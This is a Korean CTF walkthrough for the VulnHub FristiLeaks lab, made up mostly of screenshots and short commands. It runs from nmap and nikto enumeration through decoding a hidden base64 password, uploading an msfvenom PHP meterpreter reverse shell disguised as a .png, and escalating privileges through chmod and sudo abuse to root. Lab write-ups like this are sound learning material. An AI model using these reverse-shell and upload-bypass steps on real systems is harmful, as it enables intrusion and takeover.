[fristileaks](https://www.vulnhub.com/entry/fristileaks-13,133/)

# targetdiscovery
***
### nmap -sn 192.168.25.8-255 --open   
![1](https://user-images.githubusercontent.com/69203345/109809142-4ec7e480-7c6b-11eb-818d-0b1315caf74e.PNG)
# enumerate + exploitation
***
## target: 192.168.25.19
### nmap -O -sV -sS -p- 192.168.25.19
![2](https://user-images.githubusercontent.com/69203345/109809147-4f607b00-7c6b-11eb-8b51-6b87802d438c.PNG)    
### nikto -C all -h //192.168.25.19
![3](https://user-images.githubusercontent.com/69203345/109809598-d7df1b80-7c6b-11eb-9676-f79ca48532e3.PNG)
### 192.168.25.19/robots.txt
![4](https://user-images.githubusercontent.com/69203345/109809687-f3e2bd00-7c6b-11eb-869e-c8e9d22cc839.PNG)    
### 192.168.25.19/fristi
![5](https://user-images.githubusercontent.com/69203345/109809794-11178b80-7c6c-11eb-9f79-ec4bc0037bd1.PNG)   
#### 페이지 소스코드
![6](https://user-images.githubusercontent.com/69203345/109809918-3906ef00-7c6c-11eb-9f99-6da4f8ed10d8.PNG)      
id = eezeepz 추정     
pw = base 64로 암호화 추정     
### cat encode64.txt | base64 -d > decode64.txt
### mv decode64.txt decode64.png    
![7](https://user-images.githubusercontent.com/69203345/109810847-64d6a480-7c6d-11eb-87c6-c3b7273ce38d.PNG)      
id = eezeepz       
pw = 사진에 적힌 글      
![8](https://user-images.githubusercontent.com/69203345/109810995-a2d3c880-7c6d-11eb-801d-1fc4f79eeefc.PNG)     
reverse-shell upload
#### msfvenom -p php/meterpreter/reverse_tcp lhost = ip lport = port -f raw > shell.php
#### mv shell.php shell.php.png
![9](https://user-images.githubusercontent.com/69203345/109811578-5fc62500-7c6e-11eb-8db2-c56d9a0e4d0e.PNG)     
mv shell.php shell.php.png     
upload     
![10](https://user-images.githubusercontent.com/69203345/109811798-98fe9500-7c6e-11eb-9889-ac2297358850.PNG)      
![11](https://user-images.githubusercontent.com/69203345/109812343-4a9dc600-7c6f-11eb-8472-6974b80fae7c.PNG)   

# privilege escalation 
***   
![12](https://user-images.githubusercontent.com/69203345/109812487-77ea7400-7c6f-11eb-810c-402e12a395a2.PNG)
### echo "/home/admin/chmod 777 /home/admin"
### cd /home/admin
![13](https://user-images.githubusercontent.com/69203345/109812887-f810d980-7c6f-11eb-9b88-e4ad83ff56f8.PNG)
#### 코드를 바꿔주자
![14](https://user-images.githubusercontent.com/69203345/109813344-9309b380-7c70-11eb-8473-6bdec314bcea.PNG)
#### 암호를 풀어주자
![15](https://user-images.githubusercontent.com/69203345/109813352-94d37700-7c70-11eb-8e7e-355aea8eb712.PNG)
### su fristigod
### sudo -l
![16](https://user-images.githubusercontent.com/69203345/109813951-57231e00-7c71-11eb-8610-0dce3105d474.PNG)        
cd /var/fristigod/.secret_admin_stuff/      
![17](https://user-images.githubusercontent.com/69203345/109814364-c39e1d00-7c71-11eb-86c3-a5e3d16c191c.PNG)     
suid를 이용해보자      
### sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash
![18](https://user-images.githubusercontent.com/69203345/109814755-37d8c080-7c72-11eb-80d0-f803ca36883b.PNG)

![19](https://user-images.githubusercontent.com/69203345/109814924-648cd800-7c72-11eb-842b-94c7c3964056.PNG)
ㄲㅡㅌ



root획득   
꼭 이방법만 있는것은 아니다.
으악.
***

